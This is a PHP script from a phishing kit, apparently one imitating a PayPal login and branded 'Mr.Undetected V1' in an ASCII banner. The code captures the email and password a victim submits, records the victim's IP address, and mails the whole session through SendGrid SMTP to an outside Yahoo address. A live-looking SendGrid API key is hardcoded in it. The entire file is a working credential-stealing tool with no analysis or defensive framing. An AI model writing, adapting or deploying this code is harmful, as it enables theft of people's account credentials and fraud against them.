<?php
//#     #            #     #                                                              #     #   #   
//##   ## #####      #     # #    # #####  ###### ##### ######  ####  ##### ###### #####  #     #  ##   
//# # # # #    #     #     # ##   # #    # #        #   #      #    #   #   #      #    # #     # # #   
//#  #  # #    #     #     # # #  # #    # #####    #   #####  #        #   #####  #    # #     #   #   
//#     # #####  ### #     # #  # # #    # #        #   #      #        #   #      #    #  #   #    #   
//#     # #   #  ### #     # #   ## #    # #        #   #      #    #   #   #      #    #   # #     #   
//#     # #    # ###  #####  #    # #####  ######   #   ######  ####    #   ###### #####     #    ##### 





include 'function.php';
include("system.php");

$_SESSION['PPL_ID']=$_POST['login_email'];
$_SESSION['Password']=$_POST['login_password'];

$ip=$_SESSION['ip']=getip();

require_once "Mail.php";
$from = "Sandra Sender <newby.jade@Norplay.com>";
$to = "<newby.jade@yahoo.com>";
$subject=$_SESSION['subject']=" PPL Login | ".$ip."" . "\r\n";
$body = "Hi,\n\nHow are you?";
$host = "smtp.sendgrid.net";
$username = "apikey";
$password = "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";
$headers = array ('From' => $from,
  'To' => $to,
  'Subject' => $subject);
$smtp = Mail::factory('smtp',
  array ('host' => $host,
    'auth' => true,
    'username' => $username,
    'password' => $password));
$mail = $smtp->send($to, $headers, $_SESSION);
if (PEAR::isError($mail)) {
  echo("<p>" . $mail->getMessage() . "</p>");
 } else {
  echo("<p>Message successfully sent!</p>");
 }


?>